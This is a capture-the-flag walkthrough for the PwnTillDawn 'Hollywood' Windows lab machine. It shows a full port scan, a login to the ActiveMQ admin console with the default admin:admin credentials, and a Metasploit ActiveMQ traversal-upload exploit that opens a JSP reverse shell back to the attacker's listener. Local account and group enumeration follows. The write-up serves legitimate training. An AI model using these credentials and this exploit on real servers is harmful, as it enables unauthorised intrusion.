---
categories: [PwnTillDawn]
tags: [Metasploit, Public Exploit, Windows, PrivEsc]  
image:
  path: /Vulnhub-Files/img/Hollywood/Untitled.png
  alt: Hollywood Machine 🖥️
---


## Description ⤵️ 

This is a *Hollywood* machine writeup/walkthrough, from PwnTillDawn platform -> https://online.pwntilldawn.com/ with is maintain through wizlynx group -> https://www.wizlynxgroup.com/ .

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/PwnTillDawn/219]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.150.150.219
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 20:34 IST
Warning: 10.150.150.219 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.150.150.219
Host is up (0.18s latency).
Not shown: 65501 closed tcp ports (reset)
PORT      STATE    SERVICE        VERSION
21/tcp    open     ftp            FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
25/tcp    open     smtp           Mercury/32 smtpd (Mail server account Maiser)
|_smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME
79/tcp    open     finger         Mercury/32 fingerd
| finger: Login: Admin         Name: Mail System Administrator\x0D
| \x0D
|_[No profile information]\x0D
80/tcp    open     http           Apache httpd 2.4.34 ((Win32) OpenSSL/1.0.2o PHP/5.6.38)
|_http-server-header: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.38
| http-title: Welcome to XAMPP
|_Requested resource was http://10.150.150.219/dashboard/
105/tcp   open     ph-addressbook Mercury/32 PH addressbook server
106/tcp   open     pop3pw         Mercury/32 poppass service
110/tcp   open     pop3           Mercury/32 pop3d
|_pop3-capabilities: EXPIRE(NEVER) TOP USER APOP UIDL
135/tcp   open     msrpc          Microsoft Windows RPC
139/tcp   open     netbios-ssn    Microsoft Windows netbios-ssn
143/tcp   open     imap           Mercury/32 imapd 4.62
|_imap-capabilities: AUTH=PLAIN complete OK X-MERCURY-1A0001 IMAP4rev1 CAPABILITY
443/tcp   open     ssl/http       Apache httpd 2.4.34 ((Win32) OpenSSL/1.0.2o PHP/5.6.38)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.38
|_ssl-date: TLS randomness does not represent time
| http-title: Welcome to XAMPP
|_Requested resource was https://10.150.150.219/dashboard/
| tls-alpn: 
|_  http/1.1
445/tcp   open     ��G[�U         Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
554/tcp   open     rtsp?
1883/tcp  open     mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/Consumer/Topic/#: 
|_    ActiveMQ/Advisory/MasterBroker: 
2224/tcp  open     http           Mercury/32 httpd
|_http-title: Mercury HTTP Services
2869/tcp  open     http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3306/tcp  open     mysql          MariaDB (unauthorized)
5672/tcp  open     amqp?
|_amqp-info: ERROR: AMQP:handshake connection closed unexpectedly while reading frame header
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GetRequest, HTTPOptions, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    AMQP
8009/tcp  open     ajp13          Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.56
|_http-favicon: Apache Tomcat
8089/tcp  open     ssl/http       Splunkd httpd
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2019-10-28T09:17:32
|_Not valid after:  2022-10-27T09:17:32
| http-robots.txt: 1 disallowed entry 
|_/
8161/tcp  open     http           Jetty 8.1.16.v20140903
|_http-title: Apache ActiveMQ
|_http-server-header: Jetty(8.1.16.v20140903)
10243/tcp open     http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
14620/tcp filtered unknown
49152/tcp open     msrpc          Microsoft Windows RPC
49153/tcp open     msrpc          Microsoft Windows RPC
49154/tcp open     msrpc          Microsoft Windows RPC
49155/tcp open     msrpc          Microsoft Windows RPC
49156/tcp open     msrpc          Microsoft Windows RPC
49157/tcp open     msrpc          Microsoft Windows RPC
49251/tcp open     tcpwrapped
61613/tcp open     stomp          Apache ActiveMQ 5.10.1 - 5.11.1
61614/tcp open     http           Jetty 8.1.16.v20140903
|_http-server-header: Jetty(8.1.16.v20140903)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Error 500 Server Error
61616/tcp open     apachemq       ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     StackTraceEnabled
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|_    MaxInactivityDurationInitalDelay
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5672-TCP:V=7.94%I=7%D=10/3%Time=651C3189%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,8,"AMQP\0\x01\0\0")%r(HTTPOptions,8,"AMQP\0\x01\0\0")%r(RTSPRe
SF:quest,8,"AMQP\0\x01\0\0")%r(RPCCheck,8,"AMQP\0\x01\0\0")%r(DNSVersionBi
SF:ndReqTCP,8,"AMQP\0\x01\0\0")%r(DNSStatusRequestTCP,8,"AMQP\0\x01\0\0")%
SF:r(SSLSessionReq,8,"AMQP\0\x01\0\0")%r(TerminalServerCookie,8,"AMQP\0\x0
SF:1\0\0")%r(TLSSessionReq,8,"AMQP\0\x01\0\0")%r(Kerberos,8,"AMQP\0\x01\0\
SF:0")%r(SMBProgNeg,8,"AMQP\0\x01\0\0")%r(X11Probe,8,"AMQP\0\x01\0\0")%r(F
SF:ourOhFourRequest,8,"AMQP\0\x01\0\0")%r(LPDString,8,"AMQP\0\x01\0\0")%r(
SF:LDAPSearchReq,8,"AMQP\0\x01\0\0")%r(LDAPBindReq,8,"AMQP\0\x01\0\0")%r(S
SF:IPOptions,8,"AMQP\0\x01\0\0")%r(LANDesk-RC,8,"AMQP\0\x01\0\0")%r(Termin
SF:alServer,8,"AMQP\0\x01\0\0")%r(NCP,8,"AMQP\0\x01\0\0")%r(NotesRPC,8,"AM
SF:QP\0\x01\0\0")%r(WMSRequest,8,"AMQP\0\x01\0\0")%r(oracle-tns,8,"AMQP\0\
SF:x01\0\0")%r(ms-sql-s,8,"AMQP\0\x01\0\0")%r(afp,8,"AMQP\0\x01\0\0")%r(gi
SF:op,8,"AMQP\0\x01\0\0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61616-TCP:V=7.94%I=7%D=10/3%Time=651C3183%P=x86_64-pc-linux-gnu%r(N
SF:ULL,F4,"\0\0\0\xf0\x01ActiveMQ\0\0\0\n\x01\0\0\0\xde\0\0\0\t\0\x11TcpNo
SF:DelayEnabled\x01\x01\0\x12SizePrefixDisabled\x01\0\0\tCacheSize\x05\0\0
SF:\x04\0\0\x11StackTraceEnabled\x01\x01\0\x0cCacheEnabled\x01\x01\0\x14Ti
SF:ghtEncodingEnabled\x01\x01\0\x0cMaxFrameSize\x06\0\0\0\0\x06@\0\0\0\x15
SF:MaxInactivityDuration\x06\0\0\0\0\0\0u0\0\x20MaxInactivityDurationInita
SF:lDelay\x06\0\0\0\0\0\0'\x10");
Service Info: Hosts: localhost, HOLLYWOOD; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -2h05m27s, deviation: 4h36m58s, median: 34m26s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-10-03T15:58:08
|_  start_date: 2020-04-02T14:13:04
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: Hollywood
|   NetBIOS computer name: HOLLYWOOD\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-10-03T23:58:13+08:00
```

## Web Enumeration ⤵️

I firstly look at all the http and https ports try to enumerate with default credentials through doing this I got encountered with this port `8161` :

![Untitled](/Vulnhub-Files/img/Hollywood/Untitled%201.png)

I tried the login credentails as `admin : admin` and I got in →

![Untitled](/Vulnhub-Files/img/Hollywood/Untitled%202.png)

I got a flag and I also got the version of this service so I searched on web regarding the exploit and I found this →

[https://www.exploit-db.com/exploits/48181](https://www.exploit-db.com/exploits/48181)

I launched metasploit and tried this exploit and I got the shell like this →

```bash
msf6 exploit(windows/http/apache_activemq_traversal_upload) > options

Module options (exploit/windows/http/apache_activemq_traversal_upload):

   Name       Current Setting        Required  Description
   ----       ---------------        --------  -----------
   PASSWORD   admin                  yes       Password to authenticate with
   PATH       /fileserver/..\admin\  yes       Traversal path
   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                            yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                               s/using-metasploit.html
   RPORT      8161                   yes       The target port (TCP)
   SSL        false                  no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                      yes       The base path to the web application
   USERNAME   admin                  yes       Username to authenticate with
   VHOST                             no        HTTP server virtual host

Payload options (java/jsp_shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   SHELL                   no        The system shell to use.

Exploit target:

   Id  Name
   --  ----
   0   Windows Java

View the full module info with the info, or info -d command.

msf6 exploit(windows/http/apache_activemq_traversal_upload) > set RHOSTS 10.150.150.219
RHOSTS => 10.150.150.219
msf6 exploit(windows/http/apache_activemq_traversal_upload) > set LHOST tun0
LHOST => 10.66.66.178
msf6 exploit(windows/http/apache_activemq_traversal_upload) > run

[*] Started reverse TCP handler on 10.66.66.178:4444 
[*] Uploading payload...
[*] Payload sent. Attempting to execute the payload.
[+] Payload executed!
[*] Command shell session 1 opened (10.66.66.178:4444 -> 10.150.150.219:49337) at 2023-10-03 21:30:28 +0530

Shell Banner:
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin>
-----
          

C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 021A-9C32

 Directory of C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin

11/13/2018  05:06 PM    <DIR>          .
11/13/2018  05:06 PM    <DIR>          ..
02/13/2015  11:05 AM            19,091 activemq
02/13/2015  11:05 AM             5,665 activemq-admin
02/13/2015  11:05 AM             4,211 activemq-admin.bat
02/13/2015  11:05 AM             4,211 activemq.bat
02/13/2015  11:02 AM            15,956 activemq.jar
11/13/2018  05:06 PM    <DIR>          win32
11/13/2018  05:06 PM    <DIR>          win64
02/13/2015  10:54 AM            83,820 wrapper.jar
               6 File(s)        132,954 bytes
               4 Dir(s)  44,538,482,688 bytes free

C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin>C:
C:\>net users
net users

User accounts for \\HOLLYWOOD

-------------------------------------------------------------------------------
Administrator            Guest                    User                     
The command completed successfully.

C:\>whoami
whoami
hollywood\user

C:\>whoami /all
whoami /all

USER INFORMATION
----------------

User Name      SID                                           
============== ==============================================
hollywood\user S-1-5-21-2591336358-2979681539-3579421877-1000

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID                                            Attributes                                        
============================================================= ================ ============================================== ==================================================
Everyone                                                      Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114                                      Group used for deny only                          
HOLLYWOOD\HomeUsers                                           Alias            S-1-5-21-2591336358-2979681539-3579421877-1001 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544                                   Group used for deny only                          
BUILTIN\Users                                                 Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                                                 Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192                                    Mandatory group, Enabled by default, Enabled group

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\>net localgroup
net localgroup

Aliases for \\HOLLYWOOD

-------------------------------------------------------------------------------
*Administrators
*Backup Operators
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*HomeUsers
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Replicator
*Users
The command completed successfully.

C:\>net localgroup Administrators
net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
User
The command completed successfully.

C:\>
```

Now I have Administrators privileges too so , I can find all the FLAGs from here !!